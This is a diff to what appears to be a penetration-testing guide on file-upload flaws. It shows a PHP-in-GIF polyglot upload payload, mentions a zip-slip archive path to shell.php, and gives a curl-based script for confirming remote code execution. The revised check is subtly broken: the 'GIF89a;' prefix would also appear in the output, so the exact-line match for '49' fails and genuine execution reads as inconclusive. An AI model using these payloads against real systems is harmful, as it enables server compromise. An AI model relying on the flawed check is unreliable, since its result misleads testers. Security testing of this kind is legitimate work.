@@ -66,11 +66,19 @@ archive:       zip containing ../../shell.php (zip-slip) · symlink inside a tar
 **3. Verify execution, not upload.** A `200` on upload means nothing.
 
 ```bash
-# the only proof that matters: fetch it back and see the server interpret it
-printf 'GIF89a;<?php echo "zp-exec-91234"; ?>' > s.php.png
-# upload, then:
-curl -sk "$URL" | grep -q 'zp-exec-91234' && echo "CODE EXECUTED -> RCE"
-curl -sk "$URL" | grep -q '<?php'          && echo "served as source, not executed - not RCE"
+# The marker must be something the SOURCE CANNOT CONTAIN. An echo of a literal string
+# appears in the response whether the file ran or was served as text, so it proves nothing.
+# Use arithmetic the interpreter must evaluate:
+printf 'GIF89a;<?php echo 7*6+7; ?>' > s.php.png
+# upload, then fetch it back and check the NEGATIVE first:
+body=$(curl -sk "$URL")
+if grep -q '<?php' <<<"$body"; then
+  echo "served as source, NOT executed - not RCE"
+elif grep -qx '49' <<<"$body"; then
+  echo "CODE EXECUTED -> RCE"        # 49 cannot appear in the uploaded bytes
+else
+  echo "inconclusive - inspect the body by hand"
+fi
 ```
 
 If the payload comes back verbatim with `<?php` visible, the file is being served as static
